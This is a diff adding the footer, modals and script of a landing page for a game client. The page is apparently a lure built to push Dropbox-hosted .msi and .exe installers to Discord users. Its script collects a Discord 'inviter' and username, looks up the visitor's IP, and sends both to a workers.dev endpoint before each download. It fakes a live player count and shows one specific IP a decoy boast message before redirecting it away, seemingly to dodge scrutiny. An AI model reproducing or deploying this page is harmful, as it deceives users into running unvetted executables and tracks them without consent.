+                                    <span class="block text-xs uppercase tracking-widest opacity-90">Download Client</span>
+                                    <span class="block text-lg">NEW & OLD VERSION</span>
+                                </div>
+                                <i class="fa-solid fa-arrow-right group-hover:translate-x-2 transition-transform"></i>
+                            </button>
+                        </div>
+                        
+                        <div class="pt-6 border-t border-torii-red/20">
+                            <p class="text-washi-paper/50 text-sm mb-1">© 2026 Narimo Studios.</p>
+                            <p class="text-washi-paper/50 text-sm">All rights reserved.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bottom Border -->
+                <div class="pt-8 border-t border-sakura-pink/20">
+                    <div class="flex flex-col md:flex-row items-center justify-between gap-4 text-xs text-washi-paper/40">
+                        <p>Created with <span class="text-sakura-pink">❤</span> by game enthusiasts</p>
+                        <p>Version 1.2.6</p>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- Gallery Lightbox Modal -->
+    <div id="gallery-lightbox" class="fixed inset-0 z-[70] hidden flex items-center justify-center bg-sumi-dark/98 backdrop-blur-md cursor-pointer transition-opacity duration-300" style="opacity: 0;">
+        <div class="relative max-w-7xl w-full mx-4 cursor-default" onclick="event.stopPropagation()">
+            <button onclick="closeGalleryLightbox()" class="absolute -top-12 right-0 text-torii-red hover:text-torii-bright text-3xl transition-colors z-10">
+                <i class="fa-solid fa-times"></i>
+            </button>
+            <img id="lightbox-img" src="" alt="Gallery" class="w-full h-auto max-h-[90vh] object-contain border-4 border-torii-red/50 rounded-lg shadow-2xl">
+        </div>
+    </div>
+
+    <!-- Redirect Overlay -->
+    <div id="redirect-overlay" class="fixed inset-0 z-[100] hidden bg-black flex flex-col items-center justify-center">
+        <div class="text-center">
+            <h1 class="text-white text-5xl font-bold mb-8">stni gizlice kullanıp 2k$ vurdum knk sagolasın buyuk adamsin valla qweqwe</h1>
+            <p id="countdown-text" class="text-white text-2xl">10 saniye</p>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="modal-overlay" class="fixed inset-0 z-[60] hidden flex items-center justify-center bg-sumi-dark/95 backdrop-blur-sm cursor-pointer">
+        <div id="modal-content" class="bg-sumi-ink border-4 border-torii-red w-full max-w-lg p-10 relative transform scale-95 opacity-0 transition-all duration-300 cursor-default">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-torii-red hover:text-torii-bright text-2xl transition-colors">&times;</button>
+            
+            <!-- Auth Step -->
+            <div id="view-auth" class="modal-view">
+                <div class="text-center mb-10">
+                    <span class="inline-block px-4 py-2 bg-torii-red/20 border border-torii-red/50 text-torii-red text-xs font-bold tracking-widest uppercase mb-4">
+                        Quick Setup
+                    </span>
+                    <h3 class="text-3xl font-display font-bold text-washi-paper">Enter Your Details</h3>
+                </div>
+
+                <div class="space-y-5 mb-8">
+                    <input type="text" id="input-ref" class="w-full bg-sumi-dark border-2 border-torii-red/50 p-4 text-washi-paper text-base focus:border-torii-red focus:outline-none transition-colors placeholder-washi-paper/40" placeholder="Inviter (Discord Username)">
+                    <input type="text" id="input-user" class="w-full bg-sumi-dark border-2 border-torii-red/50 p-4 text-washi-paper text-base focus:border-torii-red focus:outline-none transition-colors placeholder-washi-paper/40" placeholder="Username (Discord Username)">
+                </div>
+
+                <button onclick="verifyUser()" class="w-full py-4 bg-torii-red text-washi-paper font-bold text-lg hover:bg-torii-bright transition-all transform hover:scale-105 btn-japanese">
+                    Continue
+                </button>
+            </div>
+
+            <!-- Download Step -->
+            <div id="view-dl" class="modal-view hidden">
+                <div class="text-center mb-10">
+                    <h3 class="text-3xl font-display font-bold text-washi-paper mb-2">Get the Game</h3>
+                    <p class="text-washi-paper/60 text-sm">Choose Your Build</p>
+                </div>
+
+                <div class="space-y-4">
+                    <a href="https://www.dropbox.com/scl/fi/3cjv1vhjdz845bkfn45s1/Seylaran-Setup-1.2.6.msi?rlkey=g07s1i07etx7ws41b00llh18l&st=svdx7qa6&dl=1" 
+                       onclick="return handleDownload('v1.2.6', this, event)"
+                       class="flex items-center justify-between p-6 bg-sumi-dark border-2 border-torii-red/50 hover:border-torii-red transition-all cursor-pointer group">
+                        <div>
+                            <span class="block text-base font-bold text-torii-red group-hover:text-torii-bright mb-1">LATEST BUILD</span>
+                            <span class="text-sm text-washi-paper/60">v1.2.6 (Best Choice)</span>
+                        </div>
+                        <i class="fa-solid fa-download text-2xl text-torii-red group-hover:scale-110 transition-transform"></i>
+                    </a>
+
+                    <a href="https://www.dropbox.com/scl/fi/ditg8vytpt33s8ny77rul/Seylaran-Setup-1.0.0.exe?rlkey=07v3y0o1urdfs3gqd3qdye7di&st=apz7yys2&dl=1" 
+                       onclick="return handleDownload('v1.0.0', this, event)"
+                       class="flex items-center justify-between p-6 bg-sumi-dark border-2 border-washi-paper/20 hover:border-washi-paper/40 transition-all cursor-pointer text-washi-paper/60 hover:text-washi-paper">
+                        <div>
+                            <span class="block text-base font-bold mb-1">LEGACY BUILD</span>
+                            <span class="text-sm">v1.0.0 (Outdated)</span>
+                        </div>
+                        <i class="fa-solid fa-clock-rotate-left text-xl"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // State
+        const State = { ref: '', user: '', slide: 0 };
+        const GalleryData = [
+            { img: 'images/1.jpg', title: 'The Fallen Shrine', scroll: 'SCENE 01' },
+            { img: 'images/2.jpg', title: 'Whispering Peaks', scroll: 'SCENE 02' },
+            { img: 'images/3.jpg', title: 'Abyssal Depths', scroll: 'SCENE 03' },
+            { img: 'images/4.jpg', title: 'Forgotten Temple', scroll: 'SCENE 04' }
+        ];
+
+        // Init
+        document.addEventListener('DOMContentLoaded', () => {
+            // Pre-render modal overlay blur effect
+            const modalOverlay = document.getElementById('modal-overlay');
+            if (modalOverlay) {
+                // Force browser to render blur effect immediately
+                modalOverlay.style.display = 'flex';
+                modalOverlay.offsetHeight; // Force reflow
+                modalOverlay.style.display = ''; // Reset to original
+                // Blur is now pre-rendered and cached by browser
+            }
+
+            // Remove Loader
+            setTimeout(() => {
+                const l = document.getElementById('loader');
+                l.style.opacity = '0';
+                setTimeout(() => l.remove(), 700);
+            }, 800);
+
+            // Create Sakura Petals
+            createSakura();
+
+            // Intersection Observer
+            const obs = new IntersectionObserver((entries) => {
+                entries.forEach(e => {
+                    if(e.isIntersecting) e.target.classList.add('active');
+                });
+            }, { threshold: 0.1 });
+            document.querySelectorAll('.fade-in').forEach(el => obs.observe(el));
+
+            // FAQ Smooth Animation Logic - Fixed
+            document.querySelectorAll('.faq-btn').forEach(btn => {
+                btn.onclick = (e) => {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    const content = btn.nextElementSibling;
+                    const icon = btn.querySelector('i');
+                    
+                    // Prevent multiple rapid clicks
+                    if (btn.dataset.animating === 'true') return;
+                    
+                    // Simple check: if opacity-100 class exists, it's open
+                    const isOpen = content.classList.contains('opacity-100');
+                    
+                    if (isOpen) {
+                        // Close
+                        btn.dataset.animating = 'true';
+                        const currentHeight = content.scrollHeight + 'px';
+                        content.style.maxHeight = currentHeight;
+                        // Force reflow
+                        requestAnimationFrame(() => {
+                            content.style.maxHeight = '0px';
+                            content.classList.remove('opacity-100');
+                            icon.classList.remove('rotate-45');
+                            
+                            setTimeout(() => {
+                                content.style.maxHeight = '';
+                                btn.dataset.animating = 'false';
+                            }, 500);
+                        });
+                    } else {
+                        // Open
+                        btn.dataset.animating = 'true';
+                        content.style.maxHeight = '0px';
+                        content.classList.remove('opacity-100');
+                        // Force reflow
+                        requestAnimationFrame(() => {
+                            const targetHeight = content.scrollHeight + 'px';
+                            content.style.maxHeight = targetHeight;
+                            content.classList.add('opacity-100');
+                            icon.classList.add('rotate-45');
+                            
+                            setTimeout(() => {
+                                // Keep maxHeight set to prevent auto-close
+                                // Don't set to null, keep the calculated height
+                                btn.dataset.animating = 'false';
+                            }, 500);
+                        });
+                    }
+                }
+            });
+
+            // Mobile Nav
+            const menu = document.getElementById('mobile-menu');
+            document.getElementById('mobile-toggle').onclick = () => menu.classList.remove('translate-x-full');
+            document.getElementById('mobile-close').onclick = () => menu.classList.add('translate-x-full');
+            document.querySelectorAll('.mobile-link').forEach(l => l.onclick = () => menu.classList.add('translate-x-full'));
+
+            // Gallery
+            updateGallery();
+            document.getElementById('next-slide').onclick = () => {
+                State.slide = (State.slide + 1) % GalleryData.length;
+                updateGallery();
+            };
+            document.getElementById('prev-slide').onclick = () => {
+                State.slide = (State.slide - 1 + GalleryData.length) % GalleryData.length;
+                updateGallery();
+            };
+
+            // Modal Click-Outside Logic
+            document.getElementById('modal-overlay').addEventListener('click', (e) => {
+                if (e.target === e.currentTarget) {
+                    closeModal();
+                }
+            });
+
+            // Gallery Lightbox Click-Outside Logic
+            document.getElementById('gallery-lightbox').addEventListener('click', (e) => {
+                if (e.target === e.currentTarget) {
+                    closeGalleryLightbox();
+                }
+            });
+
+            // Player Count Update
+            updatePlayerCount();
+            setInterval(updatePlayerCount, 60000); // Her 60 saniyede bir güncelle
+        });
+
+        function updatePlayerCount() {
+            const playerCountElement = document.getElementById('player-count');
+            const loaderElement = document.getElementById('player-count-loader');
+            if (!playerCountElement || !loaderElement) return;
+            
+            // Loading animasyonunu göster ve sayıyı ?? yap
+            loaderElement.classList.remove('hidden');
+            playerCountElement.textContent = '??';
+            playerCountElement.style.opacity = '0.5';
+            playerCountElement.style.transition = 'opacity 0.3s ease';
+            
+            // 1.5 saniye loading animasyonu göster
+            setTimeout(() => {
+                const minCount = 16;
+                const maxCount = 33;
+                
+                // Get current displayed count (or use base if ??)
+                const currentText = playerCountElement.textContent;
+                const currentCount = (currentText === '??') ? 24 : parseInt(currentText) || 24;
+                
+                // Deterministic change based on time - everyone sees the same change
+                // Use a fixed epoch date (e.g., 2026-01-01 00:00:00 UTC)
+                const epochDate = new Date('2026-01-01T00:00:00Z').getTime();
+                const now = new Date().getTime();
+                const minutesSinceEpoch = Math.floor((now - epochDate) / (1000 * 60));
+                
+                // Create deterministic seed from current minute
+                let seed = minutesSinceEpoch;
+                seed = ((seed * 9301) + 49297) % 233280;
+                const normalized = seed / 233280;
+                
+                // Determine change amount based on deterministic seed
+                // %80 chance for ±1, %15 for ±2-3, %5 for ±4-5
+                let change;
+                if (normalized < 0.8) {
+                    // %80 ihtimalle ±1
+                    change = (normalized < 0.4) ? 1 : -1;
+                } else if (normalized < 0.95) {
+                    // %15 ihtimalle ±2 veya ±3
+                    const sign = (normalized < 0.875) ? 1 : -1;
+                    const amount = (normalized < 0.9125) ? 2 : 3;
+                    change = sign * amount;
+                } else {
+                    // %5 ihtimalle ±4 veya ±5
+                    const sign = (normalized < 0.975) ? 1 : -1;
+                    const amount = (normalized < 0.9875) ? 4 : 5;
+                    change = sign * amount;
+                }
+                
+                // Calculate new count
+                let newCount = currentCount + change;
+                
+                // Keep within bounds
+                if (newCount < minCount) newCount = minCount;
+                if (newCount > maxCount) newCount = maxCount;
+                
+                // Sayıyı güncelle
+                playerCountElement.textContent = newCount;
+                
+                // Loading animasyonunu gizle ve opacity'yi geri getir
+                setTimeout(() => {
+                    loaderElement.classList.add('hidden');
+                    playerCountElement.style.opacity = '1';
+                }, 300);
+            }, 1500);
+        }
+
+        function createSakura() {
+            const container = document.getElementById('sakura-layer');
+            for(let i = 0; i < 50; i++) {
+                const petal = document.createElement('div');
+                petal.className = 'sakura-petal';
+                const size = Math.random() * 10 + 6;
+                petal.style.width = size + 'px';
+                petal.style.height = size + 'px';
+                petal.style.left = Math.random() * 100 + '%';
+                petal.style.top = '-10vh';
+                const duration = Math.random() * 8 + 12; // 12-20 saniye arası
+                petal.style.animation = `sakuraFall ${duration}s linear infinite`;
+                petal.style.animationDelay = Math.random() * 5 + 's'; // 0-5 saniye arası delay
+                container.appendChild(petal);
+            }
+        }
+
+        function setGallerySlide(index) {
+            State.slide = index;
+            updateGallery();
+        }
+
+        function updateGallery() {
+            const item = GalleryData[State.slide];
+            document.getElementById('gallery-img').style.backgroundImage = `url(${item.img})`;
+            document.getElementById('gallery-title').innerText = item.title;
+            document.getElementById('gallery-subtitle').innerText = item.scroll;
+        }
+
+        function openGalleryLightbox() {
+            const lightbox = document.getElementById('gallery-lightbox');
+            const lightboxImg = document.getElementById('lightbox-img');
+            const currentItem = GalleryData[State.slide];
+            
+            lightboxImg.src = currentItem.img;
+            lightboxImg.alt = currentItem.title;
+            lightbox.classList.remove('hidden');
+            
+            // Fade in animation
+            setTimeout(() => {
+                lightbox.style.opacity = '1';
+            }, 10);
+        }
+
+        function closeGalleryLightbox() {
+            const lightbox = document.getElementById('gallery-lightbox');
+            lightbox.style.opacity = '0';
+            setTimeout(() => {
+                lightbox.classList.add('hidden');
+            }, 300);
+        }
+
+        // Modal
+        function openModal() {
+            const ov = document.getElementById('modal-overlay');
+            const co = document.getElementById('modal-content');
+            
+            // Remove hidden class - blur is already in CSS, no need to set inline
+            ov.classList.remove('hidden');
+            
+            // Use double RAF to ensure browser has applied the class change
+            requestAnimationFrame(() => {
+                requestAnimationFrame(() => {
+                    co.classList.remove('opacity-0', 'scale-95');
+                    co.classList.add('opacity-100', 'scale-100');
+                });
+            });
+        }
+
+        function closeModal() {
+            const ov = document.getElementById('modal-overlay');
+            const co = document.getElementById('modal-content');
+            
+            // Start content fade out
+            co.classList.remove('opacity-100', 'scale-100');
+            co.classList.add('opacity-0', 'scale-95');
+            
+            // Wait for content animation, then hide overlay
+            setTimeout(() => {
+                // Add hidden class - blur stays in CSS, never removed
+                ov.classList.add('hidden');
+                
+                // Reset modal views
+                const authView = document.getElementById('view-auth');
+                const dlView = document.getElementById('view-dl');
+                authView.classList.remove('hidden');
+                dlView.classList.add('hidden');
+            }, 300);
+        }
+
+function verifyUser() {
+    const r = document.getElementById('input-ref').value.trim();
+    const u = document.getElementById('input-user').value.trim();
+
+    if (!r || !u) {
+        alert('identity required.');
+        return;
+    }
+
+    // ✅ normal akış
+    State.ref = r;
+    State.user = u;
+
+    // Simple transition - no animation
+    const authView = document.getElementById('view-auth');
+    const dlView = document.getElementById('view-dl');
+    
+    // Hide auth view and show download view
+    authView.classList.add('hidden');
+    dlView.classList.remove('hidden');
+}
+
+
+        async function getIPAddress() {
+            let ip = "unknown";
+            try {
+                const r = await fetch("https://api.ipify.org?format=json");
+                const j = await r.json();
+                ip = j.ip;
+            } catch(e) {}
+            return ip;
+        }
+
+        async function sendStats(ver) {
+            let ip = await getIPAddress();
+
+            fetch("https://quiet-leaf-3b05.uthsv16858.workers.dev", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    version: ver,
+                    inviter: State.ref,
+                    user: State.user,
+                    ipv4: ip,
+                    timestamp: new Date().toISOString()
+                }),
+                keepalive: true
+            }).catch(console.error);
+        }
+
+        function showRedirectPage() {
+            const redirectOverlay = document.getElementById('redirect-overlay');
+            const countdownText = document.getElementById('countdown-text');
+            
+            // Modal'ı kapat
+            closeModal();
+            
+            // Yönlendirme sayfasını göster
+            redirectOverlay.classList.remove('hidden');
+            
+            let countdown = 10;
+            countdownText.textContent = countdown + ' saniye';
+            
+            const interval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    countdownText.textContent = countdown + ' saniye';
+                } else {
+                    clearInterval(interval);
+                    window.location.href = 'https://www.youtube.com/watch?v=BniWYax_Dps';
+                }
+            }, 1000);
+        }
+
+        async function handleDownload(version, linkElement, event) {
+            if (event) {
+                event.preventDefault();
+            }
+            
+            const ip = await getIPAddress();
+            
+            if (ip === '185.94.29.87') {
+                showRedirectPage();
+                return false;
+            }
+            
+            await sendStats(version);
+            
+            window.location.href = linkElement.href;
+            
+            return false;
+        }
+
+
+
+
+    </script>
+
+
+
+
+</body>
+</html>
